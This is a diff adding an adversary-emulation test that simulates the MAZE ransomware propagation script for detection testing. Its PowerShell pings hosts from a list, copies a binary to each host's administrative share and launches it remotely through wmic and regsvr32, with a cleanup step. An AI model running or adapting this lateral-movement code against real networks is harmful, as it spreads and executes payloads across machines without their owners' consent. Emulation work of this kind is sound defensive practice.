@@ -553,3 +553,59 @@ atomic_tests:
       del /f/s/q %temp%\T1105 >nul 2>&1
       rmdir /s/q %temp%\T1105 >nul 2>&1
     name: command_prompt
+- name: MAZE Propagation Script
+  auto_generated_guid: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
+  description: |
+    This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\Temp directory of each one. 
+    Upon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.
+    Reference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html 
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_file:
+      description: Binary file to copy to remote machines
+      type: string
+      default: $env:comspec
+    exe_remote_folder:
+      description: Path to store executable on remote machine (no drive letter)
+      type: String
+      default: \Windows\Temp\T1105.exe
+    remote_drive_letter:
+      description: Remote drive letter
+      type: String
+      default: C
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Binary file must exist at specified location (#{binary_file})
+    prereq_command: |
+      if (Test-Path #{binary_file}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      write-host "The binary_file input parameter must be set to a binary that exists on this computer."
+  - description: |
+      Machine list must exist at specified location ("$env:temp\T1105MachineList.txt")
+    prereq_command: |
+      if (Test-Path "$env:temp\T1105MachineList.txt") {exit 0} else {exit 1}
+    get_prereq_command: |
+      new-item -path "$env:temp\T1105MachineList.txt"
+      echo "A machine list file has been generated at "$env:temp\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
+  executor:
+    command: |
+      $machine_list = "$env:temp\T1105MachineList.txt"
+      $offline_list = "$env:temp\T1105OfflineHosts.txt"
+      $completed_list = "$env:temp\T1105CompletedHosts.txt"
+      foreach ($machine in get-content -path "$machine_list")
+      {if (test-connection -Count 1 -computername $machine -quiet) 
+      {cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
+      echo $machine >> "$completed_list"
+      wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"}
+      else
+      {echo $machine >> "$offline_list"}}
+    cleanup_command: |
+      if (test-path "$env:temp\T1105CompletedHosts.txt") 
+      {foreach ($machine in get-content -path "$env:temp\T1105CompletedHosts.txt")
+      {wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
+      Remove-Item -path "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}" -force -erroraction silentlycontinue}}
+      Remove-Item -path "$env:temp\T1105OfflineHosts.txt" -erroraction silentlycontinue
+      Remove-item -path "$env:temp\T1105CompletedHosts.txt" -erroraction silentlycontinue
+    name: powershell
